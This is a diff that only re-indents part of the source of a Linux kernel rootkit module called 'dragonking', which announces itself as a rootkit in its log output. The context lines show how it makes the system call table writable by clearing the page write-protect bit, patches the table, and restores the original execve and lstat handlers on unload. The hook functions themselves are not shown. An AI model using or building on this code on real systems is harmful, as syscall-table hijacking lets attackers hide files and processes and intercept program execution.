@@ -11,20 +11,20 @@ unsigned long** sys_call_table;
 //We need this to set access permissions on the address we pass to it
 void set_addr_rw(unsigned long addr)
 {
-	    unsigned int level;
-	        pte_t *pte = lookup_address(addr, &level);
+	unsigned int level;
+	pte_t *pte = lookup_address(addr, &level);
 
-		    if (pte->pte &~ _PAGE_RW)
-			            pte->pte |= _PAGE_RW;
+	if (pte->pte &~ _PAGE_RW)
+		pte->pte |= _PAGE_RW;
 }
 
 //We need this to set our sys_call_table back to read only as the kernel requires
 void set_addr_ro(unsigned long addr)
 {
-	    unsigned int level;
-	        pte_t *pte = lookup_address(addr, &level);
+	unsigned int level;
+	pte_t *pte = lookup_address(addr, &level);
 
-		    pte->pte = pte->pte &~_PAGE_RW;
+	pte->pte = pte->pte &~_PAGE_RW;
 }
 
 
@@ -45,16 +45,16 @@ static int __init dragonking_init(void)
 	//Set back to RO
 	set_addr_ro((unsigned long) sys_call_table);
 	printk(KERN_INFO "This is a rootkit.\n");
-	return 0;    
+	return 0;
 }
 
 static void __exit dragonking_cleanup(void)
 {
-	    set_addr_rw((unsigned long) sys_call_table);
-	    sys_call_table[__NR_execve] = (unsigned long*)&orig_execve;
-	    sys_call_table[__NR_lstat] = (unsigned long*)&orig_lstat;
-	    set_addr_ro((unsigned long) sys_call_table);
-	    printk(KERN_INFO "Rootkit removed.\n");
+	set_addr_rw((unsigned long) sys_call_table);
+	sys_call_table[__NR_execve] = (unsigned long*)&orig_execve;
+	sys_call_table[__NR_lstat] = (unsigned long*)&orig_lstat;
+	set_addr_ro((unsigned long) sys_call_table);
+	printk(KERN_INFO "Rootkit removed.\n");
 }
 
 module_init(dragonking_init);
